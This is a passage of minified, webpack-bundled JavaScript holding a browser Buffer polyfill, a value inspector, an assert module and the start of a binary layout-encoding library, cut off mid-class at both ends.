                return e >>>= 0, t || T(e, 4, this.length), 16777216 * this[e] + (this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3])
            }, s.prototype.readBigUInt64LE = Z((function(e) {
                F(e >>>= 0, "offset");
                const t = this[e],
                    n = this[e + 7];
                void 0 !== t && void 0 !== n || H(e, this.length - 8);
                const r = t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24,
                    i = this[++e] + 256 * this[++e] + 65536 * this[++e] + n * 2 ** 24;
                return BigInt(r) + (BigInt(i) << BigInt(32))
            })), s.prototype.readBigUInt64BE = Z((function(e) {
                F(e >>>= 0, "offset");
                const t = this[e],
                    n = this[e + 7];
                void 0 !== t && void 0 !== n || H(e, this.length - 8);
                const r = t * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + this[++e],
                    i = this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + n;
                return (BigInt(r) << BigInt(32)) + BigInt(i)
            })), s.prototype.readIntLE = function(e, t, n) {
                e >>>= 0, t >>>= 0, n || T(e, t, this.length);
                let r = this[e],
                    i = 1,
                    o = 0;
                for (; ++o < t && (i *= 256);) r += this[e + o] * i;
                return i *= 128, r >= i && (r -= Math.pow(2, 8 * t)), r
            }, s.prototype.readIntBE = function(e, t, n) {
                e >>>= 0, t >>>= 0, n || T(e, t, this.length);
                let r = t,
                    i = 1,
                    o = this[e + --r];
                for (; r > 0 && (i *= 256);) o += this[e + --r] * i;
                return i *= 128, o >= i && (o -= Math.pow(2, 8 * t)), o
            }, s.prototype.readInt8 = function(e, t) {
                return e >>>= 0, t || T(e, 1, this.length), 128 & this[e] ? -1 * (255 - this[e] + 1) : this[e]
            }, s.prototype.readInt16LE = function(e, t) {
                e >>>= 0, t || T(e, 2, this.length);
                const n = this[e] | this[e + 1] << 8;
                return 32768 & n ? 4294901760 | n : n
            }, s.prototype.readInt16BE = function(e, t) {
                e >>>= 0, t || T(e, 2, this.length);
                const n = this[e + 1] | this[e] << 8;
                return 32768 & n ? 4294901760 | n : n
            }, s.prototype.readInt32LE = function(e, t) {
                return e >>>= 0, t || T(e, 4, this.length), this[e] | this[e + 1] << 8 | this[e + 2] << 16 | this[e + 3] << 24
            }, s.prototype.readInt32BE = function(e, t) {
                return e >>>= 0, t || T(e, 4, this.length), this[e] << 24 | this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3]
            }, s.prototype.readBigInt64LE = Z((function(e) {
                F(e >>>= 0, "offset");
                const t = this[e],
                    n = this[e + 7];
                void 0 !== t && void 0 !== n || H(e, this.length - 8);
                const r = this[e + 4] + 256 * this[e + 5] + 65536 * this[e + 6] + (n << 24);
                return (BigInt(r) << BigInt(32)) + BigInt(t + 256 * this[++e] + 65536 * this[++e] + this[++e] * 2 ** 24)
            })), s.prototype.readBigInt64BE = Z((function(e) {
                F(e >>>= 0, "offset");
                const t = this[e],
                    n = this[e + 7];
                void 0 !== t && void 0 !== n || H(e, this.length - 8);
                const r = (t << 24) + 65536 * this[++e] + 256 * this[++e] + this[++e];
                return (BigInt(r) << BigInt(32)) + BigInt(this[++e] * 2 ** 24 + 65536 * this[++e] + 256 * this[++e] + n)
            })), s.prototype.readFloatLE = function(e, t) {
                return e >>>= 0, t || T(e, 4, this.length), n.read(this, e, !0, 23, 4)
            }, s.prototype.readFloatBE = function(e, t) {
                return e >>>= 0, t || T(e, 4, this.length), n.read(this, e, !1, 23, 4)
            }, s.prototype.readDoubleLE = function(e, t) {
                return e >>>= 0, t || T(e, 8, this.length), n.read(this, e, !0, 52, 8)
            }, s.prototype.readDoubleBE = function(e, t) {
                return e >>>= 0, t || T(e, 8, this.length), n.read(this, e, !1, 52, 8)
            }, s.prototype.writeUintLE = s.prototype.writeUIntLE = function(e, t, n, r) {
                if (e = +e, t >>>= 0, n >>>= 0, !r) {
                    O(this, e, t, n, Math.pow(2, 8 * n) - 1, 0)
                }
                let i = 1,
                    o = 0;
                for (this[t] = 255 & e; ++o < n && (i *= 256);) this[t + o] = e / i & 255;
                return t + n
            }, s.prototype.writeUintBE = s.prototype.writeUIntBE = function(e, t, n, r) {
                if (e = +e, t >>>= 0, n >>>= 0, !r) {
                    O(this, e, t, n, Math.pow(2, 8 * n) - 1, 0)
                }
                let i = n - 1,
                    o = 1;
                for (this[t + i] = 255 & e; --i >= 0 && (o *= 256);) this[t + i] = e / o & 255;
                return t + n
            }, s.prototype.writeUint8 = s.prototype.writeUInt8 = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 1, 255, 0), this[t] = 255 & e, t + 1
            }, s.prototype.writeUint16LE = s.prototype.writeUInt16LE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 2, 65535, 0), this[t] = 255 & e, this[t + 1] = e >>> 8, t + 2
            }, s.prototype.writeUint16BE = s.prototype.writeUInt16BE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 2, 65535, 0), this[t] = e >>> 8, this[t + 1] = 255 & e, t + 2
            }, s.prototype.writeUint32LE = s.prototype.writeUInt32LE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 4, 4294967295, 0), this[t + 3] = e >>> 24, this[t + 2] = e >>> 16, this[t + 1] = e >>> 8, this[t] = 255 & e, t + 4
            }, s.prototype.writeUint32BE = s.prototype.writeUInt32BE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 4, 4294967295, 0), this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e, t + 4
            }, s.prototype.writeBigUInt64LE = Z((function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                return C(this, e, t, BigInt(0), BigInt("0xffffffffffffffff"))
            })), s.prototype.writeBigUInt64BE = Z((function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                return P(this, e, t, BigInt(0), BigInt("0xffffffffffffffff"))
            })), s.prototype.writeIntLE = function(e, t, n, r) {
                if (e = +e, t >>>= 0, !r) {
                    const r = Math.pow(2, 8 * n - 1);
                    O(this, e, t, n, r - 1, -r)
                }
                let i = 0,
                    o = 1,
                    s = 0;
                for (this[t] = 255 & e; ++i < n && (o *= 256);) e < 0 && 0 === s && 0 !== this[t + i - 1] && (s = 1), this[t + i] = (e / o >> 0) - s & 255;
                return t + n
            }, s.prototype.writeIntBE = function(e, t, n, r) {
                if (e = +e, t >>>= 0, !r) {
                    const r = Math.pow(2, 8 * n - 1);
                    O(this, e, t, n, r - 1, -r)
                }
                let i = n - 1,
                    o = 1,
                    s = 0;
                for (this[t + i] = 255 & e; --i >= 0 && (o *= 256);) e < 0 && 0 === s && 0 !== this[t + i + 1] && (s = 1), this[t + i] = (e / o >> 0) - s & 255;
                return t + n
            }, s.prototype.writeInt8 = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 1, 127, -128), e < 0 && (e = 255 + e + 1), this[t] = 255 & e, t + 1
            }, s.prototype.writeInt16LE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 2, 32767, -32768), this[t] = 255 & e, this[t + 1] = e >>> 8, t + 2
            }, s.prototype.writeInt16BE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 2, 32767, -32768), this[t] = e >>> 8, this[t + 1] = 255 & e, t + 2
            }, s.prototype.writeInt32LE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 4, 2147483647, -2147483648), this[t] = 255 & e, this[t + 1] = e >>> 8, this[t + 2] = e >>> 16, this[t + 3] = e >>> 24, t + 4
            }, s.prototype.writeInt32BE = function(e, t, n) {
                return e = +e, t >>>= 0, n || O(this, e, t, 4, 2147483647, -2147483648), e < 0 && (e = 4294967295 + e + 1), this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e, t + 4
            }, s.prototype.writeBigInt64LE = Z((function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                return C(this, e, t, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            })), s.prototype.writeBigInt64BE = Z((function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                return P(this, e, t, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
            })), s.prototype.writeFloatLE = function(e, t, n) {
                return N(this, e, t, !0, n)
            }, s.prototype.writeFloatBE = function(e, t, n) {
                return N(this, e, t, !1, n)
            }, s.prototype.writeDoubleLE = function(e, t, n) {
                return R(this, e, t, !0, n)
            }, s.prototype.writeDoubleBE = function(e, t, n) {
                return R(this, e, t, !1, n)
            }, s.prototype.copy = function(e, t, n, r) {
                if (!s.isBuffer(e)) throw new TypeError("argument should be a Buffer");
                if (n || (n = 0), r || 0 === r || (r = this.length), t >= e.length && (t = e.length), t || (t = 0), r > 0 && r < n && (r = n), r === n) return 0;
                if (0 === e.length || 0 === this.length) return 0;
                if (t < 0) throw new RangeError("targetStart out of bounds");
                if (n < 0 || n >= this.length) throw new RangeError("Index out of range");
                if (r < 0) throw new RangeError("sourceEnd out of bounds");
                r > this.length && (r = this.length), e.length - t < r - n && (r = e.length - t + n);
                const i = r - n;
                return this === e && "function" === typeof Uint8Array.prototype.copyWithin ? this.copyWithin(t, n, r) : Uint8Array.prototype.set.call(e, this.subarray(n, r), t), i
            }, s.prototype.fill = function(e, t, n, r) {
                if ("string" === typeof e) {
                    if ("string" === typeof t ? (r = t, t = 0, n = this.length) : "string" === typeof n && (r = n, n = this.length), void 0 !== r && "string" !== typeof r) throw new TypeError("encoding must be a string");
                    if ("string" === typeof r && !s.isEncoding(r)) throw new TypeError("Unknown encoding: " + r);
                    if (1 === e.length) {
                        const t = e.charCodeAt(0);
                        ("utf8" === r && t < 128 || "latin1" === r) && (e = t)
                    }
                } else "number" === typeof e ? e &= 255 : "boolean" === typeof e && (e = Number(e));
                if (t < 0 || this.length < t || this.length < n) throw new RangeError("Out of range index");
                if (n <= t) return this;
                let i;
                if (t >>>= 0, n = void 0 === n ? this.length : n >>> 0, e || (e = 0), "number" === typeof e)
                    for (i = t; i < n; ++i) this[i] = e;
                else {
                    const o = s.isBuffer(e) ? e : s.from(e, r),
                        a = o.length;
                    if (0 === a) throw new TypeError('The value "' + e + '" is invalid for argument "value"');
                    for (i = 0; i < n - t; ++i) this[i + t] = o[i % a]
                }
                return this
            };
            const D = {};

            function z(e, t, n) {
                D[e] = class extends n {
                    constructor() {
                        super(), Object.defineProperty(this, "message", {
                            value: t.apply(this, arguments),
                            writable: !0,
                            configurable: !0
                        }), this.name = `${this.name} [${e}]`, this.stack, delete this.name
                    }
                    get code() {
                        return e
                    }
                    set code(e) {
                        Object.defineProperty(this, "code", {
                            configurable: !0,
                            enumerable: !0,
                            value: e,
                            writable: !0
                        })
                    }
                    toString() {
                        return `${this.name} [${e}]: ${this.message}`
                    }
                }
            }

            function U(e) {
                let t = "",
                    n = e.length;
                const r = "-" === e[0] ? 1 : 0;
                for (; n >= r + 4; n -= 3) t = `_${e.slice(n-3,n)}${t}`;
                return `${e.slice(0,n)}${t}`
            }

            function j(e, t, n, r, i, o) {
                if (e > n || e < t) {
                    const r = "bigint" === typeof t ? "n" : "";
                    let i;
                    throw i = o > 3 ? 0 === t || t === BigInt(0) ? `>= 0${r} and < 2${r} ** ${8*(o+1)}${r}` : `>= -(2${r} ** ${8*(o+1)-1}${r}) and < 2 ** ${8*(o+1)-1}${r}` : `>= ${t}${r} and <= ${n}${r}`, new D.ERR_OUT_OF_RANGE("value", i, e)
                }! function(e, t, n) {
                    F(t, "offset"), void 0 !== e[t] && void 0 !== e[t + n] || H(t, e.length - (n + 1))
                }(r, i, o)
            }

            function F(e, t) {
                if ("number" !== typeof e) throw new D.ERR_INVALID_ARG_TYPE(t, "number", e)
            }

            function H(e, t, n) {
                if (Math.floor(e) !== e) throw F(e, n), new D.ERR_OUT_OF_RANGE(n || "offset", "an integer", e);
                if (t < 0) throw new D.ERR_BUFFER_OUT_OF_BOUNDS;
                throw new D.ERR_OUT_OF_RANGE(n || "offset", `>= ${n?1:0} and <= ${t}`, e)
            }
            z("ERR_BUFFER_OUT_OF_BOUNDS", (function(e) {
                return e ? `${e} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds"
            }), RangeError), z("ERR_INVALID_ARG_TYPE", (function(e, t) {
                return `The "${e}" argument must be of type number. Received type ${typeof t}`
            }), TypeError), z("ERR_OUT_OF_RANGE", (function(e, t, n) {
                let r = `The value of "${e}" is out of range.`,
                    i = n;
                return Number.isInteger(n) && Math.abs(n) > 2 ** 32 ? i = U(String(n)) : "bigint" === typeof n && (i = String(n), (n > BigInt(2) ** BigInt(32) || n < -(BigInt(2) ** BigInt(32))) && (i = U(i)), i += "n"), r += ` It must be ${t}. Received ${i}`, r
            }), RangeError);
            const W = /[^+/0-9A-Za-z-_]/g;

            function K(e, t) {
                let n;
                t = t || 1 / 0;
                const r = e.length;
                let i = null;
                const o = [];
                for (let s = 0; s < r; ++s) {
                    if (n = e.charCodeAt(s), n > 55295 && n < 57344) {
                        if (!i) {
                            if (n > 56319) {
                                (t -= 3) > -1 && o.push(239, 191, 189);
                                continue
                            }
                            if (s + 1 === r) {
                                (t -= 3) > -1 && o.push(239, 191, 189);
                                continue
                            }
                            i = n;
                            continue
                        }
                        if (n < 56320) {
                            (t -= 3) > -1 && o.push(239, 191, 189), i = n;
                            continue
                        }
                        n = 65536 + (i - 55296 << 10 | n - 56320)
                    } else i && (t -= 3) > -1 && o.push(239, 191, 189);
                    if (i = null, n < 128) {
                        if ((t -= 1) < 0) break;
                        o.push(n)
                    } else if (n < 2048) {
                        if ((t -= 2) < 0) break;
                        o.push(n >> 6 | 192, 63 & n | 128)
                    } else if (n < 65536) {
                        if ((t -= 3) < 0) break;
                        o.push(n >> 12 | 224, n >> 6 & 63 | 128, 63 & n | 128)
                    } else {
                        if (!(n < 1114112)) throw new Error("Invalid code point");
                        if ((t -= 4) < 0) break;
                        o.push(n >> 18 | 240, n >> 12 & 63 | 128, n >> 6 & 63 | 128, 63 & n | 128)
                    }
                }
                return o
            }

            function q(e) {
                return t.toByteArray(function(e) {
                    if ((e = (e = e.split("=")[0]).trim().replace(W, "")).length < 2) return "";
                    for (; e.length % 4 !== 0;) e += "=";
                    return e
                }(e))
            }

            function V(e, t, n, r) {
                let i;
                for (i = 0; i < r && !(i + n >= t.length || i >= e.length); ++i) t[i + n] = e[i];
                return i
            }

            function Q(e, t) {
                return e instanceof t || null != e && null != e.constructor && null != e.constructor.name && e.constructor.name === t.name
            }

            function G(e) {
                return e !== e
            }
            const Y = function() {
                const e = "0123456789abcdef",
                    t = new Array(256);
                for (let n = 0; n < 16; ++n) {
                    const r = 16 * n;
                    for (let i = 0; i < 16; ++i) t[r + i] = e[n] + e[i]
                }
                return t
            }();

            function Z(e) {
                return "undefined" === typeof BigInt ? J : e
            }

            function J() {
                throw new Error("BigInt not supported")
            }
        }(Go);
        var os = "undefined" !== typeof __webpack_require__.g ? __webpack_require__.g : "undefined" !== typeof self ? self : "undefined" !== typeof window ? window : {},
            ss = "function" === typeof Object.create ? function(e, t) {
                e.super_ = t, e.prototype = Object.create(t.prototype, {
                    constructor: {
                        value: e,
                        enumerable: !1,
                        writable: !0,
                        configurable: !0
                    }
                })
            } : function(e, t) {
                e.super_ = t;
                var n = function() {};
                n.prototype = t.prototype, e.prototype = new n, e.prototype.constructor = e
            };

        function as(e, t) {
            var n = {
                seen: [],
                stylize: cs
            };
            return arguments.length >= 3 && (n.depth = arguments[2]), arguments.length >= 4 && (n.colors = arguments[3]), ds(t) ? n.showHidden = t : t && Es(n, t), gs(n.showHidden) && (n.showHidden = !1), gs(n.depth) && (n.depth = 2), gs(n.colors) && (n.colors = !1), gs(n.customInspect) && (n.customInspect = !0), n.colors && (n.stylize = us), ls(n, e, n.depth)
        }

        function us(e, t) {
            var n = as.styles[t];
            return n ? "\x1b[" + as.colors[n][0] + "m" + e + "\x1b[" + as.colors[n][1] + "m" : e
        }

        function cs(e, t) {
            return e
        }

        function ls(e, t, n) {
            if (e.customInspect && t && As(t.inspect) && t.inspect !== as && (!t.constructor || t.constructor.prototype !== t)) {
                var r = t.inspect(n, e);
                return ys(r) || (r = ls(e, r, n)), r
            }
            var i = function(e, t) {
                if (gs(t)) return e.stylize("undefined", "undefined");
                if (ys(t)) {
                    var n = "'" + JSON.stringify(t).replace(/^"|"$/g, "").replace(/'/g, "\\'").replace(/\\"/g, '"') + "'";
                    return e.stylize(n, "string")
                }
                if (r = t, "number" === typeof r) return e.stylize("" + t, "number");
                var r;
                if (ds(t)) return e.stylize("" + t, "boolean");
                if (ps(t)) return e.stylize("null", "null")
            }(e, t);
            if (i) return i;
            var o = Object.keys(t),
                s = function(e) {
                    var t = {};
                    return e.forEach((function(e, n) {
                        t[e] = !0
                    })), t
                }(o);
            if (e.showHidden && (o = Object.getOwnPropertyNames(t)), vs(t) && (o.indexOf("message") >= 0 || o.indexOf("description") >= 0)) return fs(t);
            if (0 === o.length) {
                if (As(t)) {
                    var a = t.name ? ": " + t.name : "";
                    return e.stylize("[Function" + a + "]", "special")
                }
                if (ms(t)) return e.stylize(RegExp.prototype.toString.call(t), "regexp");
                if (bs(t)) return e.stylize(Date.prototype.toString.call(t), "date");
                if (vs(t)) return fs(t)
            }
            var u, c, l = "",
                f = !1,
                h = ["{", "}"];
            (u = t, Array.isArray(u) && (f = !0, h = ["[", "]"]), As(t)) && (l = " [Function" + (t.name ? ": " + t.name : "") + "]");
            return ms(t) && (l = " " + RegExp.prototype.toString.call(t)), bs(t) && (l = " " + Date.prototype.toUTCString.call(t)), vs(t) && (l = " " + fs(t)), 0 !== o.length || f && 0 != t.length ? n < 0 ? ms(t) ? e.stylize(RegExp.prototype.toString.call(t), "regexp") : e.stylize("[Object]", "special") : (e.seen.push(t), c = f ? function(e, t, n, r, i) {
                for (var o = [], s = 0, a = t.length; s < a; ++s) Ss(t, String(s)) ? o.push(hs(e, t, n, r, String(s), !0)) : o.push("");
                return i.forEach((function(i) {
                    i.match(/^\d+$/) || o.push(hs(e, t, n, r, i, !0))
                })), o
            }(e, t, n, s, o) : o.map((function(r) {
                return hs(e, t, n, s, r, f)
            })), e.seen.pop(), function(e, t, n) {
                if (e.reduce((function(e, t) {
                        return t.indexOf("\n"), e + t.replace(/\u001b\[\d\d?m/g, "").length + 1
                    }), 0) > 60) return n[0] + ("" === t ? "" : t + "\n ") + " " + e.join(",\n  ") + " " + n[1];
                return n[0] + t + " " + e.join(", ") + " " + n[1]
            }(c, l, h)) : h[0] + l + h[1]
        }

        function fs(e) {
            return "[" + Error.prototype.toString.call(e) + "]"
        }

        function hs(e, t, n, r, i, o) {
            var s, a, u;
            if ((u = Object.getOwnPropertyDescriptor(t, i) || {
                    value: t[i]
                }).get ? a = u.set ? e.stylize("[Getter/Setter]", "special") : e.stylize("[Getter]", "special") : u.set && (a = e.stylize("[Setter]", "special")), Ss(r, i) || (s = "[" + i + "]"), a || (e.seen.indexOf(u.value) < 0 ? (a = ps(n) ? ls(e, u.value, null) : ls(e, u.value, n - 1)).indexOf("\n") > -1 && (a = o ? a.split("\n").map((function(e) {
                    return "  " + e
                })).join("\n").substr(2) : "\n" + a.split("\n").map((function(e) {
                    return "   " + e
                })).join("\n")) : a = e.stylize("[Circular]", "special")), gs(s)) {
                if (o && i.match(/^\d+$/)) return a;
                (s = JSON.stringify("" + i)).match(/^"([a-zA-Z_][a-zA-Z_0-9]*)"$/) ? (s = s.substr(1, s.length - 2), s = e.stylize(s, "name")) : (s = s.replace(/'/g, "\\'").replace(/\\"/g, '"').replace(/(^"|"$)/g, "'"), s = e.stylize(s, "string"))
            }
            return s + ": " + a
        }

        function ds(e) {
            return "boolean" === typeof e
        }

        function ps(e) {
            return null === e
        }

        function ys(e) {
            return "string" === typeof e
        }

        function gs(e) {
            return void 0 === e
        }

        function ms(e) {
            return ws(e) && "[object RegExp]" === _s(e)
        }

        function ws(e) {
            return "object" === typeof e && null !== e
        }

        function bs(e) {
            return ws(e) && "[object Date]" === _s(e)
        }

        function vs(e) {
            return ws(e) && ("[object Error]" === _s(e) || e instanceof Error)
        }

        function As(e) {
            return "function" === typeof e
        }

        function ks(e) {
            return null === e || "boolean" === typeof e || "number" === typeof e || "string" === typeof e || "symbol" === typeof e || "undefined" === typeof e
        }

        function _s(e) {
            return Object.prototype.toString.call(e)
        }

        function Es(e, t) {
            if (!t || !ws(t)) return e;
            for (var n = Object.keys(t), r = n.length; r--;) e[n[r]] = t[n[r]];
            return e
        }

        function Ss(e, t) {
            return Object.prototype.hasOwnProperty.call(e, t)
        }

        function Is(e, t) {
            if (e === t) return 0;
            for (var n = e.length, r = t.length, i = 0, o = Math.min(n, r); i < o; ++i)
                if (e[i] !== t[i]) {
                    n = e[i], r = t[i];
                    break
                }
            return n < r ? -1 : r < n ? 1 : 0
        }
        as.colors = {
            bold: [1, 22],
            italic: [3, 23],
            underline: [4, 24],
            inverse: [7, 27],
            white: [37, 39],
            grey: [90, 39],
            black: [30, 39],
            blue: [34, 39],
            cyan: [36, 39],
            green: [32, 39],
            magenta: [35, 39],
            red: [31, 39],
            yellow: [33, 39]
        }, as.styles = {
            special: "cyan",
            number: "yellow",
            boolean: "yellow",
            undefined: "grey",
            null: "bold",
            string: "green",
            date: "magenta",
            regexp: "red"
        };
        var xs, Ms = Object.prototype.hasOwnProperty,
            Bs = Object.keys || function(e) {
                var t = [];
                for (var n in e) Ms.call(e, n) && t.push(n);
                return t
            },
            Ts = Array.prototype.slice;

        function Os() {
            return "undefined" !== typeof xs ? xs : xs = "foo" === function() {}.name
        }

        function Cs(e) {
            return Object.prototype.toString.call(e)
        }

        function Ps(e) {
            return !Go.isBuffer(e) && ("function" === typeof os.ArrayBuffer && ("function" === typeof ArrayBuffer.isView ? ArrayBuffer.isView(e) : !!e && (e instanceof DataView || !!(e.buffer && e.buffer instanceof ArrayBuffer))))
        }

        function Ls(e, t) {
            e || js(e, !0, t, "==", Fs)
        }
        var Ns = /\s*function\s+([^\(\s]*)\s*/;

        function Rs(e) {
            if (As(e)) {
                if (Os()) return e.name;
                var t = e.toString().match(Ns);
                return t && t[1]
            }
        }

        function Ds(e) {
            this.name = "AssertionError", this.actual = e.actual, this.expected = e.expected, this.operator = e.operator, e.message ? (this.message = e.message, this.generatedMessage = !1) : (this.message = function(e) {
                return zs(Us(e.actual), 128) + " " + e.operator + " " + zs(Us(e.expected), 128)
            }(this), this.generatedMessage = !0);
            var t = e.stackStartFunction || js;
            if (Error.captureStackTrace) Error.captureStackTrace(this, t);
            else {
                var n = new Error;
                if (n.stack) {
                    var r = n.stack,
                        i = Rs(t),
                        o = r.indexOf("\n" + i);
                    if (o >= 0) {
                        var s = r.indexOf("\n", o + 1);
                        r = r.substring(s + 1)
                    }
                    this.stack = r
                }
            }
        }

        function zs(e, t) {
            return "string" === typeof e ? e.length < t ? e : e.slice(0, t) : e
        }

        function Us(e) {
            if (Os() || !As(e)) return as(e);
            var t = Rs(e);
            return "[Function" + (t ? ": " + t : "") + "]"
        }

        function js(e, t, n, r, i) {
            throw new Ds({
                message: n,
                actual: e,
                expected: t,
                operator: r,
                stackStartFunction: i
            })
        }

        function Fs(e, t) {
            e || js(e, !0, t, "==", Fs)
        }

        function Hs(e, t, n, r) {
            if (e === t) return !0;
            if (Go.isBuffer(e) && Go.isBuffer(t)) return 0 === Is(e, t);
            if (bs(e) && bs(t)) return e.getTime() === t.getTime();
            if (ms(e) && ms(t)) return e.source === t.source && e.global === t.global && e.multiline === t.multiline && e.lastIndex === t.lastIndex && e.ignoreCase === t.ignoreCase;
            if (null !== e && "object" === typeof e || null !== t && "object" === typeof t) {
                if (Ps(e) && Ps(t) && Cs(e) === Cs(t) && !(e instanceof Float32Array || e instanceof Float64Array)) return 0 === Is(new Uint8Array(e.buffer), new Uint8Array(t.buffer));
                if (Go.isBuffer(e) !== Go.isBuffer(t)) return !1;
                var i = (r = r || {
                    actual: [],
                    expected: []
                }).actual.indexOf(e);
                return -1 !== i && i === r.expected.indexOf(t) || (r.actual.push(e), r.expected.push(t), function(e, t, n, r) {
                    if (null === e || void 0 === e || null === t || void 0 === t) return !1;
                    if (ks(e) || ks(t)) return e === t;
                    if (n && Object.getPrototypeOf(e) !== Object.getPrototypeOf(t)) return !1;
                    var i = Ws(e),
                        o = Ws(t);
                    if (i && !o || !i && o) return !1;
                    if (i) return Hs(e = Ts.call(e), t = Ts.call(t), n);
                    var s, a, u = Bs(e),
                        c = Bs(t);
                    if (u.length !== c.length) return !1;
                    for (u.sort(), c.sort(), a = u.length - 1; a >= 0; a--)
                        if (u[a] !== c[a]) return !1;
                    for (a = u.length - 1; a >= 0; a--)
                        if (!Hs(e[s = u[a]], t[s], n, r)) return !1;
                    return !0
                }(e, t, n, r))
            }
            return n ? e === t : e == t
        }

        function Ws(e) {
            return "[object Arguments]" == Object.prototype.toString.call(e)
        }

        function Ks(e, t) {
            if (!e || !t) return !1;
            if ("[object RegExp]" == Object.prototype.toString.call(t)) return t.test(e);
            try {
                if (e instanceof t) return !0
            } catch (n) {}
            return !Error.isPrototypeOf(t) && !0 === t.call({}, e)
        }

        function qs(e, t, n, r) {
            var i;
            if ("function" !== typeof t) throw new TypeError('"block" argument must be a function');
            "string" === typeof n && (r = n, n = null), i = function(e) {
                var t;
                try {
                    e()
                } catch (n) {
                    t = n
                }
                return t
            }(t), r = (n && n.name ? " (" + n.name + ")." : ".") + (r ? " " + r : "."), e && !i && js(i, n, "Missing expected exception" + r);
            var o = "string" === typeof r,
                s = !e && i && !n;
            if ((!e && vs(i) && o && Ks(i, n) || s) && js(i, n, "Got unwanted exception" + r), e && i && n && !Ks(i, n) || !e && i) throw i
        }
        Ls.AssertionError = Ds, ss(Ds, Error), Ls.fail = js, Ls.ok = Fs, Ls.equal = function e(t, n, r) {
            t != n && js(t, n, r, "==", e)
        }, Ls.notEqual = function e(t, n, r) {
            t == n && js(t, n, r, "!=", e)
        }, Ls.deepEqual = function e(t, n, r) {
            Hs(t, n, !1) || js(t, n, r, "deepEqual", e)
        }, Ls.deepStrictEqual = function e(t, n, r) {
            Hs(t, n, !0) || js(t, n, r, "deepStrictEqual", e)
        }, Ls.notDeepEqual = function e(t, n, r) {
            Hs(t, n, !1) && js(t, n, r, "notDeepEqual", e)
        }, Ls.notDeepStrictEqual = function e(t, n, r) {
            Hs(t, n, !0) && js(t, n, r, "notDeepStrictEqual", e)
        }, Ls.strictEqual = function e(t, n, r) {
            t !== n && js(t, n, r, "===", e)
        }, Ls.notStrictEqual = function e(t, n, r) {
            t === n && js(t, n, r, "!==", e)
        }, Ls.throws = function(e, t, n) {
            qs(!0, e, t, n)
        }, Ls.doesNotThrow = function(e, t, n) {
            qs(!1, e, t, n)
        }, Ls.ifError = function(e) {
            if (e) throw e
        };
        var Vs = {};
        class Qs {
            constructor(e, t) {
                if (!Number.isInteger(e)) throw new TypeError("span must be an integer");
                this.span = e, this.property = t
            }
            makeDestinationObject() {
                return {}
            }
            decode(e, t) {
                throw new Error("Layout is abstract")
            }
            encode(e, t, n) {
                throw new Error("Layout is abstract")
            }
            getSpan(e, t) {
                if (0 > this.span) throw new RangeError("indeterminate span");
                return this.span
            }
            replicate(e) {
                const t = Object.create(this.constructor.prototype);
                return Object.assign(t, this), t.property = e, t
            }
            fromArray(e) {}
        }

        function Gs(e, t) {
            return t.property ? e + "[" + t.property + "]" : e
        }
        Vs.Layout = Qs, Vs.nameWithProperty = Gs, Vs.bindConstructorLayout = function(e, t) {
            if ("function" !== typeof e) throw new TypeError("Class must be constructor");
            if (e.hasOwnProperty("layout_")) throw new Error("Class is already bound to a layout");
            if (!(t && t instanceof Qs)) throw new TypeError("layout must be a Layout");
            if (t.hasOwnProperty("boundConstructor_")) throw new Error("layout is already bound to a constructor");
            e.layout_ = t, t.boundConstructor_ = e, t.makeDestinationObject = () => new e, Object.defineProperty(e.prototype, "encode", {
                value: function(e, n) {
                    return t.encode(this, e, n)
                },
                writable: !0
            }), Object.defineProperty(e, "decode", {
                value: function(e, n) {
                    return t.decode(e, n)
                },
                writable: !0
            })
        };
        class Ys extends Qs {
            isCount() {
                throw new Error("ExternalLayout is abstract")
            }
        }
        class Zs extends Ys {
            constructor(e, t) {
                if (void 0 === e && (e = 1), !Number.isInteger(e) || 0 >= e) throw new TypeError("elementSpan must be a (positive) integer");
                super(-1, t), this.elementSpan = e
            }
            isCount() {
                return !0
            }
            decode(e, t) {
                void 0 === t && (t = 0);
                const n = e.length - t;
                return Math.floor(n / this.elementSpan)
            }
            encode(e, t, n) {
                return 0
            }
        }
        class Js extends Ys {
            constructor(e, t, n) {
                if (!(e instanceof Qs)) throw new TypeError("layout must be a Layout");
                if (void 0 === t) t = 0;
                else if (!Number.isInteger(t)) throw new TypeError("offset must be integer or undefined");
                super(e.span, n || e.property), this.layout = e, this.offset = t
            }
            isCount() {
                return this.layout instanceof Xs || this.layout instanceof $s
            }
            decode(e, t) {
                return void 0 === t && (t = 0), this.layout.decode(e, t + this.offset)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), this.layout.encode(e, t, n + this.offset)
            }
        }
        class Xs extends Qs {
            constructor(e, t) {
                if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
            }
            decode(e, t) {
                return void 0 === t && (t = 0), e.readUIntLE(t, this.span)
            }
            encode(e, t, n) {
                return void 0 === n && (n = 0), t.writeUIntLE(e, n, this.span), this.span
            }
        }
        class $s extends Qs {
            constructor(e, t) {
                if (super(e, t), 6 < this.span) throw new RangeError("span must not exceed 6 bytes")
            }
